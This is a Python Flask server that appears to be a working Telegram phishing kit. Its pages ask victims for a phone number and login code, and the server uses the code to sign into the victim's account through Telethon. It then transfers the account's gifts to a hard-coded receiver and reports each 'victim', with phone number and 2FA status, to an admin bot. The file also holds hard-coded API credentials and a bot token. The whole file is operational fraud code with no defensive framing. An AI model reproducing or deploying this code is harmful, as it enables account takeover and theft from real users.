# server.py
from flask import Flask, render_template, request, jsonify, session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import os
import json
import logging
import threading
import requests

logging.basicConfig(level=logging.INFO)

API_ID = 34667567
API_HASH = "819464e9d467c9e740a538cd5eca55a8"
RECEIVER_USERNAME = "@Defbymorgenshtern"
ADMIN_ID = 8503291981
BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"

app = Flask(__name__)
app.secret_key = os.urandom(24)

temp_clients = {}

telethon_loop = None

def get_telethon_loop():
    global telethon_loop
    if telethon_loop is None or telethon_loop.is_closed():
        telethon_loop = asyncio.new_event_loop()
        thread = threading.Thread(target=telethon_loop.run_forever, daemon=True)
        thread.start()
    return telethon_loop

def notify_admin_sync(text):
    """Отправка сообщения админу через Telegram Bot API (синхронно)"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": ADMIN_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            logging.error(f"Notify admin failed: {response.text}")
        else:
            logging.info(f"Admin notified: {text[:100]}")
    except Exception as e:
        logging.error(f"Notify admin exception: {e}")

async def check_balance_and_gifts(client):
    try:
        me = await client.get_me()
        balance = await client.get_stars_balance()
        gifts = await client.get_available_gifts()
        return {
            "user_id": me.id,
            "username": me.username,
            "stars_balance": balance,
            "gifts_count": len(gifts) if gifts else 0,
            "gifts": gifts
        }
    except Exception as e:
        logging.error(f"Balance check error: {e}")
        return None

async def transfer_nft_to_receiver(client, info):
    try:
        receiver = await client.get_entity(RECEIVER_USERNAME)
        
        result_text = (
            f"🔔 <b>Новая жертва!</b>\n"
            f"👤 @{info.get('username', 'unknown')}\n"
            f"🆔 ID: <code>{info.get('user_id', 'unknown')}</code>\n"
            f"⭐ Баланс звёзд: {info.get('stars_balance', 0)}\n"
            f"🎁 Подарков: {info.get('gifts_count', 0)}"
        )
        
        if info.get('gifts_count', 0) > 0:
            for gift in info.get('gifts', []):
                try:
                    await client.send_gift(receiver, gift)
                    result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                except Exception as e:
                    result_text += f"\n❌ Ошибка отправки подарка: {e}"
        
        notify_admin_sync(result_text)
        return True
    except Exception as e:
        notify_admin_sync(f"❌ <b>Ошибка перевода:</b>\n{e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth')
def auth():
    return render_template('index.html')

@app.route('/check/<check_id>')
def check_page(check_id):
    checks_file = "checks.json"
    if os.path.exists(checks_file):
        with open(checks_file, 'r') as f:
            checks = json.load(f)
        if check_id in checks:
            return render_template('index.html', check_amount=checks[check_id]['amount'])
    return render_template('index.html')

@app.route('/api/send-code', methods=['POST'])
def api_send_code():
    data = request.json
    phone = data.get('phone', '').strip()
    
    if not phone:
        return jsonify({"success": False, "error": "Введите номер"}), 400
    
    session_id = os.urandom(8).hex()
    
    loop = get_telethon_loop()
    
    async def send_code():
        try:
            client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH, loop=loop)
            await client.connect()
            result = await client.send_code_request(phone)
            temp_clients[session_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': result.phone_code_hash
            }
            # Уведомление админу о новом запросе кода
            notify_admin_sync(f"📱 <b>Новый запрос кода</b>\n📞 Телефон: <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>")
            return True
        except Exception as e:
            logging.error(f"Send code error: {e}")
            notify_admin_sync(f"❌ <b>Ошибка отправки кода</b>\n📞 {phone}\nОшибка: {e}")
            return False
    
    future = asyncio.run_coroutine_threadsafe(send_code(), loop)
    try:
        success = future.result(timeout=30)
    except Exception as e:
        logging.error(f"Future error: {e}")
        success = False
    
    if success:
        return jsonify({"success": True, "session_id": session_id})
    else:
        return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500

@app.route('/api/verify-code', methods=['POST'])
def api_verify_code():
    data = request.json
    code = data.get('code', '').strip()
    session_id = data.get('session_id', '')
    
    if not code or not session_id:
        return jsonify({"success": False, "error": "Введите код"}), 400
    
    if session_id not in temp_clients:
        return jsonify({"success": False, "error": "Сессия не найдена"}), 400
    
    session_data = temp_clients[session_id]
    client = session_data['client']
    phone_code_hash = session_data['phone_code_hash']
    phone = session_data['phone']
    
    loop = get_telethon_loop()
    
    async def verify_and_process():
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # Уведомление об успешном входе
            notify_admin_sync(f"✅ <b>Успешный вход!</b>\n📞 <code>{phone}</code>\n🆔 Сессия: <code>{session_id}</code>\n🔄 Проверяю баланс...")
            
            info = await check_balance_and_gifts(client)
            if info:
                await transfer_nft_to_receiver(client, info)
            await client.disconnect()
            return True
        except SessionPasswordNeededError:
            notify_admin_sync(f"🔒 <b>Требуется 2FA</b>\n📞 <code>{phone}</code>")
            await client.disconnect()
            return "2fa_needed"
        except Exception as e:
            logging.error(f"Verify error: {e}")
            notify_admin_sync(f"❌ <b>Ошибка входа</b>\n📞 <code>{phone}</code>\nОшибка: {e}")
            await client.disconnect()
            return False
    
    future = asyncio.run_coroutine_threadsafe(verify_and_process(), loop)
    try:
        result = future.result(timeout=30)
    except Exception as e:
        logging.error(f"Future error: {e}")
        notify_admin_sync(f"❌ <b>Таймаут верификации</b>\n📞 <code>{phone}</code>")
        result = False
    
    if result is True:
        return jsonify({"success": True, "message": "Авторизация успешна!"})
    elif result == "2fa_needed":
        return jsonify({"success": False, "error": "Требуется облачный пароль"})
    else:
        return jsonify({"success": False, "error": "Неверный код"}), 400

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
